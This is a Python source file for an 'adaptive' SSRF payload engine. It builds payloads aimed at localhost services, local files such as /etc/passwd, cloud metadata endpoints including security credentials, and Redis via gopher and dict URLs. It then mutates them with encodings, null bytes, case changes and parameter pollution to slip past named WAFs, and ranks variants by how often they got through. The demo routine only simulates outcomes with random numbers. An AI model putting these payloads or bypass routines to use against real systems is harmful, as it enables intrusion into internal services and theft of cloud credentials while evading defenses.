"""
Adaptive Payload Generation Engine with WAF Bypass Logic
Intelligent payload mutation and evasion technique adaptation
"""

import random
import hashlib
import base64
import urllib.parse
import json
import time
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

class PayloadCategory(Enum):
    LOCALHOST = "localhost"
    FILE_SYSTEM = "file_system"
    CLOUD_METADATA = "cloud_metadata"
    PROTOCOL_SMUGGLING = "protocol_smuggling"
    DNS_REBINDING = "dns_rebinding"

class EncodingTechnique(Enum):
    URL_ENCODE = "url_encode"
    DOUBLE_URL_ENCODE = "double_url_encode"
    UNICODE_ENCODE = "unicode_encode"
    HTML_ENCODE = "html_encode"
    BASE64_ENCODE = "base64_encode"
    HEX_ENCODE = "hex_encode"
    DECIMAL_ENCODE = "decimal_encode"
    OCTAL_ENCODE = "octal_encode"

class EvasionStrategy(Enum):
    CASE_VARIATION = "case_variation"
    NULL_BYTE_INJECTION = "null_byte_injection"
    PATH_TRAVERSAL = "path_traversal"
    PROTOCOL_CONFUSION = "protocol_confusion"
    PARAMETER_POLLUTION = "parameter_pollution"
    FRAGMENT_INJECTION = "fragment_injection"

@dataclass
class PayloadTemplate:
    """Template for generating SSRF payloads"""
    category: PayloadCategory
    base_payload: str
    variables: List[str]
    encoding_compatibility: List[EncodingTechnique]
    evasion_compatibility: List[EvasionStrategy]
    success_indicators: List[str]
    failure_indicators: List[str]

@dataclass
class WAFSignature:
    """WAF detection signature"""
    name: str
    patterns: List[str]
    confidence_threshold: float
    bypass_techniques: List[str]

@dataclass
class PayloadResult:
    """Result of payload testing"""
    payload: str
    original_template: str
    encoding_applied: List[EncodingTechnique]
    evasion_applied: List[EvasionStrategy]
    success: bool
    response_code: int
    response_time: float
    waf_triggered: bool
    vulnerability_detected: bool
    confidence: float

class AdaptivePayloadEngine:
    """Intelligent payload generation engine with adaptive WAF bypass"""

    def __init__(self):
        self.payload_templates = self._initialize_payload_templates()
        self.waf_signatures = self._initialize_waf_signatures()
        self.success_history = []
        self.failure_history = []
        self.waf_bypass_knowledge = {}
        self.adaptation_learning = {}

    def _initialize_payload_templates(self) -> List[PayloadTemplate]:
        """Initialize comprehensive payload templates"""

        return [
            # Localhost access templates
            PayloadTemplate(
                category=PayloadCategory.LOCALHOST,
                base_payload="http://127.0.0.1",
                variables=["ip", "port", "path"],
                encoding_compatibility=[
                    EncodingTechnique.URL_ENCODE,
                    EncodingTechnique.DOUBLE_URL_ENCODE,
                    EncodingTechnique.DECIMAL_ENCODE,
                    EncodingTechnique.HEX_ENCODE,
                    EncodingTechnique.OCTAL_ENCODE
                ],
                evasion_compatibility=[
                    EvasionStrategy.CASE_VARIATION,
                    EvasionStrategy.NULL_BYTE_INJECTION,
                    EvasionStrategy.FRAGMENT_INJECTION
                ],
                success_indicators=["localhost", "127.0.0.1", "internal", "private"],
                failure_indicators=["blocked", "forbidden", "access denied"]
            ),
            PayloadTemplate(
                category=PayloadCategory.LOCALHOST,
                base_payload="http://localhost",
                variables=["subdomain", "port", "path"],
                encoding_compatibility=[
                    EncodingTechnique.URL_ENCODE,
                    EncodingTechnique.UNICODE_ENCODE,
                    EncodingTechnique.HTML_ENCODE
                ],
                evasion_compatibility=[
                    EvasionStrategy.CASE_VARIATION,
                    EvasionStrategy.PROTOCOL_CONFUSION
                ],
                success_indicators=["localhost", "127.0.0.1", "internal"],
                failure_indicators=["blocked", "invalid", "denied"]
            ),

            # File system access templates
            PayloadTemplate(
                category=PayloadCategory.FILE_SYSTEM,
                base_payload="file:///etc/passwd",
                variables=["path", "filename"],
                encoding_compatibility=[
                    EncodingTechnique.URL_ENCODE,
                    EncodingTechnique.DOUBLE_URL_ENCODE,
                    EncodingTechnique.UNICODE_ENCODE
                ],
                evasion_compatibility=[
                    EvasionStrategy.PATH_TRAVERSAL,
                    EvasionStrategy.NULL_BYTE_INJECTION,
                    EvasionStrategy.CASE_VARIATION
                ],
                success_indicators=["root:", "daemon:", "/bin/bash", "passwd"],
                failure_indicators=["not found", "access denied", "blocked"]
            ),
            PayloadTemplate(
                category=PayloadCategory.FILE_SYSTEM,
                base_payload="file:///windows/win.ini",
                variables=["drive", "path", "filename"],
                encoding_compatibility=[
                    EncodingTechnique.URL_ENCODE,
                    EncodingTechnique.DOUBLE_URL_ENCODE,
                    EncodingTechnique.UNICODE_ENCODE
                ],
                evasion_compatibility=[
                    EvasionStrategy.PATH_TRAVERSAL,
                    EvasionStrategy.CASE_VARIATION,
                    EvasionStrategy.NULL_BYTE_INJECTION
                ],
                success_indicators=["[fonts]", "[extensions]", "win.ini"],
                failure_indicators=["not found", "access denied", "blocked"]
            ),

            # Cloud metadata templates
            PayloadTemplate(
                category=PayloadCategory.CLOUD_METADATA,
                base_payload="http://169.254.169.254/latest/meta-data/",
                variables=["endpoint", "version"],
                encoding_compatibility=[
                    EncodingTechnique.URL_ENCODE,
                    EncodingTechnique.HEX_ENCODE,
                    EncodingTechnique.DECIMAL_ENCODE
                ],
                evasion_compatibility=[
                    EvasionStrategy.CASE_VARIATION,
                    EvasionStrategy.FRAGMENT_INJECTION,
                    EvasionStrategy.PARAMETER_POLLUTION
                ],
                success_indicators=["ami-id", "instance", "security-credentials", "metadata"],
                failure_indicators=["timeout", "unreachable", "blocked"]
            ),
            PayloadTemplate(
                category=PayloadCategory.CLOUD_METADATA,
                base_payload="http://metadata.google.internal/computeMetadata/v1/",
                variables=["service", "endpoint"],
                encoding_compatibility=[
                    EncodingTechnique.URL_ENCODE,
                    EncodingTechnique.UNICODE_ENCODE
                ],
                evasion_compatibility=[
                    EvasionStrategy.CASE_VARIATION,
                    EvasionStrategy.PROTOCOL_CONFUSION
                ],
                success_indicators=["instance", "project", "service-accounts", "metadata"],
                failure_indicators=["not found", "forbidden", "blocked"]
            ),

            # Protocol smuggling templates
            PayloadTemplate(
                category=PayloadCategory.PROTOCOL_SMUGGLING,
                base_payload="gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
                variables=["host", "port", "command"],
                encoding_compatibility=[
                    EncodingTechnique.URL_ENCODE,
                    EncodingTechnique.DOUBLE_URL_ENCODE,
                    EncodingTechnique.HEX_ENCODE
                ],
                evasion_compatibility=[
                    EvasionStrategy.CASE_VARIATION,
                    EvasionStrategy.PROTOCOL_CONFUSION
                ],
                success_indicators=["redis_version", "connected_clients", "keyspace"],
                failure_indicators=["connection refused", "timeout", "blocked"]
            ),
            PayloadTemplate(
                category=PayloadCategory.PROTOCOL_SMUGGLING,
                base_payload="dict://127.0.0.1:6379/info",
                variables=["host", "port", "command"],
                encoding_compatibility=[
                    EncodingTechnique.URL_ENCODE,
                    EncodingTechnique.UNICODE_ENCODE
                ],
                evasion_compatibility=[
                    EvasionStrategy.PROTOCOL_CONFUSION,
                    EvasionStrategy.PARAMETER_POLLUTION
                ],
                success_indicators=["redis", "server", "clients"],
                failure_indicators=["connection refused", "invalid", "blocked"]
            ),

            # DNS rebinding templates
            PayloadTemplate(
                category=PayloadCategory.DNS_REBINDING,
                base_payload="http://rebind.network/s/127.0.0.1/",
                variables=["service", "target"],
                encoding_compatibility=[
                    EncodingTechnique.URL_ENCODE,
                    EncodingTechnique.UNICODE_ENCODE
                ],
                evasion_compatibility=[
                    EvasionStrategy.CASE_VARIATION,
                    EvasionStrategy.FRAGMENT_INJECTION
                ],
                success_indicators=["localhost", "internal", "private"],
                failure_indicators=["dns error", "resolution failed", "blocked"]
            )
        ]

    def _initialize_waf_signatures(self) -> List[WAFSignature]:
        """Initialize WAF detection signatures"""

        return [
            WAFSignature(
                name="ModSecurity",
                patterns=[
                    "ModSecurity",
                    "406 Not Acceptable",
                    "403 Forbidden",
                    "Reference #[0-9]+",
                    "Access denied with code"
                ],
                confidence_threshold=0.8,
                bypass_techniques=[
                    "double_encoding",
                    "unicode_normalization",
                    "case_variation",
                    "parameter_pollution"
                ]
            ),
            WAFSignature(
                name="Cloudflare",
                patterns=[
                    "cloudflare",
                    "cf-ray",
                    "403 Forbidden",
                    "Access denied",
                    "Error 1020"
                ],
                confidence_threshold=0.9,
                bypass_techniques=[
                    "protocol_confusion",
                    "fragment_injection",
                    "timing_variation",
                    "header_manipulation"
                ]
            ),
            WAFSignature(
                name="AWS WAF",
                patterns=[
                    "AWS",
                    "RequestId:",
                    "403 Forbidden",
                    "Access Denied",
                    "Invalid request"
                ],
                confidence_threshold=0.85,
                bypass_techniques=[
                    "encoding_variation",
                    "case_manipulation",
                    "null_byte_injection"
                ]
            ),
            WAFSignature(
                name="Akamai",
                patterns=[
                    "akamai",
                    "Reference #[0-9]+",
                    "Access denied",
                    "Request blocked"
                ],
                confidence_threshold=0.8,
                bypass_techniques=[
                    "unicode_encoding",
                    "path_traversal",
                    "protocol_smuggling"
                ]
            ),
            WAFSignature(
                name="Generic SSRF Protection",
                patterns=[
                    "ssrf",
                    "localhost",
                    "127.0.0.1",
                    "file://",
                    "metadata",
                    "internal"
                ],
                confidence_threshold=0.7,
                bypass_techniques=[
                    "ip_encoding",
                    "domain_variation",
                    "protocol_case_variation"
                ]
            )
        ]

    def detect_waf(self, response_content: str, response_headers: Dict[str, str], response_code: int) -> Optional[WAFSignature]:
        """Detect WAF from response characteristics"""

        response_text = response_content.lower()
        headers_text = str(response_headers).lower()
        combined_text = f"{response_text} {headers_text}"

        detected_wafs = []

        for waf in self.waf_signatures:
            matches = 0
            total_patterns = len(waf.patterns)

            for pattern in waf.patterns:
                if pattern.lower() in combined_text:
                    matches += 1

            confidence = matches / total_patterns
            if confidence >= waf.confidence_threshold:
                detected_wafs.append((waf, confidence))

        if detected_wafs:
            # Return the WAF with highest confidence
            return max(detected_wafs, key=lambda x: x[1])[0]

        return None

    def generate_adaptive_payload(self, template: PayloadTemplate, target_info: Dict[str, Any] = None) -> List[str]:
        """Generate adaptive payloads based on template and target information"""

        base_payloads = []

        # Generate base variations
        base_payloads.append(template.base_payload)

        # Apply variable substitutions
        if "ip" in template.variables:
            ip_variations = self._generate_ip_variations(template.base_payload)
            base_payloads.extend(ip_variations)

        if "path" in template.variables:
            path_variations = self._generate_path_variations(template.base_payload)
            base_payloads.extend(path_variations)

        if "protocol" in template.variables:
            protocol_variations = self._generate_protocol_variations(template.base_payload)
            base_payloads.extend(protocol_variations)

        # Apply encoding techniques
        encoded_payloads = []
        for payload in base_payloads:
            for encoding in template.encoding_compatibility:
                encoded = self._apply_encoding(payload, encoding)
                encoded_payloads.append(encoded)

        # Apply evasion strategies
        final_payloads = []
        for payload in encoded_payloads:
            for evasion in template.evasion_compatibility:
                evaded = self._apply_evasion(payload, evasion)
                final_payloads.append(evaded)

        # Remove duplicates and limit count
        unique_payloads = list(set(final_payloads))
        return unique_payloads[:20]  # Limit to 20 payloads per template

    def _generate_ip_variations(self, base_payload: str) -> List[str]:
        """Generate IP address variations"""

        variations = []

        if "127.0.0.1" in base_payload:
            ip_variants = [
                "127.1",
                "0177.0.0.1",        # Octal
                "2130706433",        # Decimal
                "0x7f000001",        # Hex
                "127.000.000.001",   # Zero-padded
                "127.0.0.1.xip.io",  # DNS service
                "localtest.me",      # Alternative domain
                "lvh.me",            # Another alternative
                "[::1]",             # IPv6 localhost
                "0:0:0:0:0:ffff:7f00:0001",  # IPv6 embedded IPv4
            ]

            for variant in ip_variants:
                variations.append(base_payload.replace("127.0.0.1", variant))

        if "localhost" in base_payload:
            localhost_variants = [
                "LOCALHOST",
                "LocalHost",
                "localhost.localdomain",
                "local.host",
                "127.0.0.1",
                "localtest.me",
                "vcap.me"
            ]

            for variant in localhost_variants:
                variations.append(base_payload.replace("localhost", variant))

        return variations

    def _generate_path_variations(self, base_payload: str) -> List[str]:
        """Generate path traversal variations"""

        variations = []

        if "/etc/passwd" in base_payload:
            path_variants = [
                "/etc/passwd",
                "/etc/../etc/passwd",
                "/etc/./passwd",
                "/var/../etc/passwd",
                "/etc/passwd%00",
                "/etc/passwd%00.jpg",
                "/../etc/passwd",
                "/proc/self/environ",
                "/proc/version",
                "/proc/cmdline"
            ]

            for variant in path_variants:
                variations.append(base_payload.replace("/etc/passwd", variant))

        if "/windows/win.ini" in base_payload:
            windows_variants = [
                "/windows/win.ini",
                "/windows/../windows/win.ini",
                "/windows/./win.ini",
                "/WINDOWS/WIN.INI",
                "/windows/win.ini%00",
                "/windows/system32/drivers/etc/hosts",
                "/windows/system.ini"
            ]

            for variant in windows_variants:
                variations.append(base_payload.replace("/windows/win.ini", variant))

        return variations

    def _generate_protocol_variations(self, base_payload: str) -> List[str]:
        """Generate protocol variations"""

        variations = []
        protocols = ["http", "https", "ftp", "file", "gopher", "dict", "ldap", "sftp"]

        for protocol in protocols:
            if base_payload.startswith("http://"):
                variations.append(base_payload.replace("http://", f"{protocol}://"))
            elif base_payload.startswith("https://"):
                variations.append(base_payload.replace("https://", f"{protocol}://"))

        return variations

    def _apply_encoding(self, payload: str, technique: EncodingTechnique) -> str:
        """Apply encoding technique to payload"""

        if technique == EncodingTechnique.URL_ENCODE:
            return urllib.parse.quote(payload, safe=':/?#[]@!$&\'()*+,;=')

        elif technique == EncodingTechnique.DOUBLE_URL_ENCODE:
            encoded_once = urllib.parse.quote(payload, safe='')
            return urllib.parse.quote(encoded_once, safe='')

        elif technique == EncodingTechnique.UNICODE_ENCODE:
            # Convert to unicode escape sequences
            return ''.join(f'\\u{ord(c):04x}' if ord(c) > 127 else c for c in payload)

        elif technique == EncodingTechnique.HTML_ENCODE:
            return ''.join(f'&#{ord(c)};' if c in '<>&"' else c for c in payload)

        elif technique == EncodingTechnique.BASE64_ENCODE:
            encoded = base64.b64encode(payload.encode()).decode()
            return f"data:text/plain;base64,{encoded}"

        elif technique == EncodingTechnique.HEX_ENCODE:
            return ''.join(f'%{ord(c):02x}' for c in payload)

        elif technique == EncodingTechnique.DECIMAL_ENCODE:
            # Convert IP addresses to decimal
            if "127.0.0.1" in payload:
                return payload.replace("127.0.0.1", "2130706433")
            return payload

        elif technique == EncodingTechnique.OCTAL_ENCODE:
            # Convert IP addresses to octal
            if "127.0.0.1" in payload:
                return payload.replace("127.0.0.1", "0177.0.0.1")
            return payload

        return payload

    def _apply_evasion(self, payload: str, strategy: EvasionStrategy) -> str:
        """Apply evasion strategy to payload"""

        if strategy == EvasionStrategy.CASE_VARIATION:
            # Randomly vary case
            return ''.join(c.upper() if random.random() < 0.3 else c.lower() for c in payload)

        elif strategy == EvasionStrategy.NULL_BYTE_INJECTION:
            # Add null bytes at strategic positions
            positions = [len(payload) // 2, len(payload) - 4]
            for pos in positions:
                if 0 <= pos < len(payload):
                    payload = payload[:pos] + '%00' + payload[pos:]
            return payload

        elif strategy == EvasionStrategy.PATH_TRAVERSAL:
            # Add path traversal sequences
            if "/" in payload:
                return payload.replace("/", "/../")
            return payload

        elif strategy == EvasionStrategy.PROTOCOL_CONFUSION:
            # Mix protocol cases
            for protocol in ["http", "https", "ftp", "file"]:
                if payload.startswith(f"{protocol}://"):
                    mixed_case = ''.join(random.choice([c.upper(), c.lower()]) for c in protocol)
                    return payload.replace(f"{protocol}://", f"{mixed_case}://")
            return payload

        elif strategy == EvasionStrategy.PARAMETER_POLLUTION:
            # Add dummy parameters
            separator = "&" if "?" in payload else "?"
            dummy_params = ["debug=1", "test=value", "cache=false"]
            return payload + separator + "&".join(random.sample(dummy_params, 2))

        elif strategy == EvasionStrategy.FRAGMENT_INJECTION:
            # Add URL fragments
            fragments = ["#section", "#top", "#content", "#main"]
            return payload + random.choice(fragments)

        return payload

    def adapt_based_on_response(self, payload_result: PayloadResult):
        """Adapt future payload generation based on response"""

        # Store result for learning
        if payload_result.success:
            self.success_history.append(payload_result)
        else:
            self.failure_history.append(payload_result)

        # Learn from WAF detections
        if payload_result.waf_triggered:
            key = f"{payload_result.original_template}_waf"
            if key not in self.waf_bypass_knowledge:
                self.waf_bypass_knowledge[key] = {"failures": [], "successes": []}

            self.waf_bypass_knowledge[key]["failures"].append({
                "encoding": payload_result.encoding_applied,
                "evasion": payload_result.evasion_applied,
                "response_code": payload_result.response_code
            })

        # Learn from successful bypasses
        if payload_result.success and payload_result.vulnerability_detected:
            key = f"{payload_result.original_template}_success"
            if key not in self.waf_bypass_knowledge:
                self.waf_bypass_knowledge[key] = {"failures": [], "successes": []}

            self.waf_bypass_knowledge[key]["successes"].append({
                "encoding": payload_result.encoding_applied,
                "evasion": payload_result.evasion_applied,
                "confidence": payload_result.confidence
            })

    def get_optimized_payloads_for_target(self, target_info: Dict[str, Any]) -> List[str]:
        """Get optimized payloads based on target characteristics and learning"""

        optimized_payloads = []

        # Analyze target characteristics
        target_type = target_info.get("type", "unknown")
        security_level = target_info.get("security_level", "medium")
        detected_waf = target_info.get("detected_waf")

        # Select appropriate templates based on target
        selected_templates = self._select_templates_for_target(target_type, security_level)

        # Generate payloads for each template
        for template in selected_templates:
            # Apply learned optimizations
            template_payloads = self.generate_adaptive_payload(template, target_info)

            # Filter based on previous success/failure patterns
            filtered_payloads = self._filter_based_on_learning(template_payloads, template, detected_waf)

            optimized_payloads.extend(filtered_payloads)

        # Sort by predicted success probability
        scored_payloads = [(p, self._calculate_success_probability(p, target_info)) for p in optimized_payloads]
        scored_payloads.sort(key=lambda x: x[1], reverse=True)

        return [p[0] for p in scored_payloads[:50]]  # Return top 50 payloads

    def _select_templates_for_target(self, target_type: str, security_level: str) -> List[PayloadTemplate]:
        """Select appropriate templates based on target characteristics"""

        if target_type == "cloud":
            return [t for t in self.payload_templates if t.category == PayloadCategory.CLOUD_METADATA]
        elif target_type == "internal":
            return [t for t in self.payload_templates if t.category == PayloadCategory.LOCALHOST]
        elif target_type == "file_server":
            return [t for t in self.payload_templates if t.category == PayloadCategory.FILE_SYSTEM]
        else:
            # Return all templates for unknown targets
            return self.payload_templates

    def _filter_based_on_learning(self, payloads: List[str], template: PayloadTemplate, detected_waf: str) -> List[str]:
        """Filter payloads based on previous learning"""

        if not self.waf_bypass_knowledge:
            return payloads

        # Filter out payloads similar to previous failures
        filtered = []
        for payload in payloads:
            should_include = True

            # Check against known failures
            for failure in self.failure_history[-10:]:  # Check last 10 failures
                if self._payloads_similar(payload, failure.payload):
                    should_include = False
                    break

            if should_include:
                filtered.append(payload)

        return filtered if filtered else payloads[:5]  # Return at least 5 payloads

    def _payloads_similar(self, payload1: str, payload2: str) -> bool:
        """Check if two payloads are similar"""

        # Simple similarity check based on core patterns
        core1 = self._extract_core_pattern(payload1)
        core2 = self._extract_core_pattern(payload2)

        return core1 == core2

    def _extract_core_pattern(self, payload: str) -> str:
        """Extract core pattern from payload (removing encoding/evasion)"""

        # Remove common encodings and variations
        core = payload.lower()
        core = urllib.parse.unquote(core)
        core = core.replace("%00", "")
        core = core.split("#")[0]  # Remove fragments
        core = core.split("?")[0]  # Remove parameters

        return core

    def _calculate_success_probability(self, payload: str, target_info: Dict[str, Any]) -> float:
        """Calculate predicted success probability for payload"""

        base_probability = 0.5

        # Boost based on previous successes
        for success in self.success_history[-20:]:  # Check last 20 successes
            if self._payloads_similar(payload, success.payload):
                base_probability += 0.2

        # Reduce based on previous failures
        for failure in self.failure_history[-20:]:  # Check last 20 failures
            if self._payloads_similar(payload, failure.payload):
                base_probability -= 0.1

        # Adjust based on encoding complexity
        encoding_count = payload.count("%") + payload.count("\\u")
        base_probability += min(encoding_count * 0.05, 0.2)

        # Adjust based on target security level
        security_level = target_info.get("security_level", "medium")
        if security_level == "high":
            base_probability *= 0.7
        elif security_level == "low":
            base_probability *= 1.3

        return max(0.0, min(1.0, base_probability))

    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive report of engine performance"""

        total_attempts = len(self.success_history) + len(self.failure_history)
        success_rate = len(self.success_history) / total_attempts if total_attempts > 0 else 0

        # Analyze most successful techniques
        successful_encodings = {}
        successful_evasions = {}

        for success in self.success_history:
            for encoding in success.encoding_applied:
                successful_encodings[encoding.value] = successful_encodings.get(encoding.value, 0) + 1

            for evasion in success.evasion_applied:
                successful_evasions[evasion.value] = successful_evasions.get(evasion.value, 0) + 1

        return {
            "engine_performance": {
                "total_attempts": total_attempts,
                "successful_attempts": len(self.success_history),
                "failed_attempts": len(self.failure_history),
                "success_rate": success_rate,
                "avg_confidence": sum(s.confidence for s in self.success_history) / len(self.success_history) if self.success_history else 0
            },
            "most_successful_techniques": {
                "encodings": dict(sorted(successful_encodings.items(), key=lambda x: x[1], reverse=True)[:5]),
                "evasions": dict(sorted(successful_evasions.items(), key=lambda x: x[1], reverse=True)[:5])
            },
            "learning_database": {
                "waf_bypass_entries": len(self.waf_bypass_knowledge),
                "adaptation_entries": len(self.adaptation_learning)
            },
            "payload_templates": len(self.payload_templates),
            "waf_signatures": len(self.waf_signatures)
        }

# Example usage and testing
async def main():
    """Test the adaptive payload engine"""

    print("Adaptive Payload Generation Engine Test")
    print("Intelligent WAF bypass and payload mutation\n")

    engine = AdaptivePayloadEngine()

    # Test payload generation for different targets
    targets = [
        {"type": "cloud", "security_level": "high", "detected_waf": "Cloudflare"},
        {"type": "internal", "security_level": "medium", "detected_waf": "ModSecurity"},
        {"type": "file_server", "security_level": "low", "detected_waf": None}
    ]

    all_results = []

    for i, target in enumerate(targets, 1):
        print(f"Target {i}: {target['type']} (Security: {target['security_level']})")

        # Generate optimized payloads
        payloads = engine.get_optimized_payloads_for_target(target)
        print(f"Generated {len(payloads)} optimized payloads")

        # Simulate testing some payloads
        for j, payload in enumerate(payloads[:5]):  # Test first 5 payloads
            print(f"  Payload {j+1}: {payload[:60]}...")

            # Simulate payload testing result
            result = PayloadResult(
                payload=payload,
                original_template="test_template",
                encoding_applied=[EncodingTechnique.URL_ENCODE],
                evasion_applied=[EvasionStrategy.CASE_VARIATION],
                success=random.random() < 0.3,  # 30% success rate
                response_code=random.choice([200, 403, 500]),
                response_time=random.uniform(0.1, 2.0),
                waf_triggered=random.random() < 0.4,  # 40% WAF trigger rate
                vulnerability_detected=random.random() < 0.2,  # 20% vulnerability rate
                confidence=random.uniform(0.6, 0.95)
            )

            # Adapt based on result
            engine.adapt_based_on_response(result)
            all_results.append(result)

            if result.success and result.vulnerability_detected:
                print(f"    SUCCESS: Vulnerability detected (Confidence: {result.confidence:.1%})")
            elif result.waf_triggered:
                print(f"    BLOCKED: WAF triggered (Code: {result.response_code})")
            else:
                print(f"    FAILED: No vulnerability (Code: {result.response_code})")

        print()

    # Generate final report
    report = engine.generate_report()

    print("Engine Performance Report:")
    print(f"  Total Attempts: {report['engine_performance']['total_attempts']}")
    print(f"  Success Rate: {report['engine_performance']['success_rate']:.1%}")
    print(f"  Average Confidence: {report['engine_performance']['avg_confidence']:.1%}")

    print(f"\nMost Successful Techniques:")
    print(f"  Encodings: {report['most_successful_techniques']['encodings']}")
    print(f"  Evasions: {report['most_successful_techniques']['evasions']}")

    print(f"\nLearning Database:")
    print(f"  WAF Bypass Entries: {report['learning_database']['waf_bypass_entries']}")
    print(f"  Payload Templates: {report['payload_templates']}")

    # Save report
    with open("adaptive_payload_engine_report.json", "w") as f:
        json.dump(report, f, indent=2, default=str)

    print(f"\nDetailed report saved: adaptive_payload_engine_report.json")

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
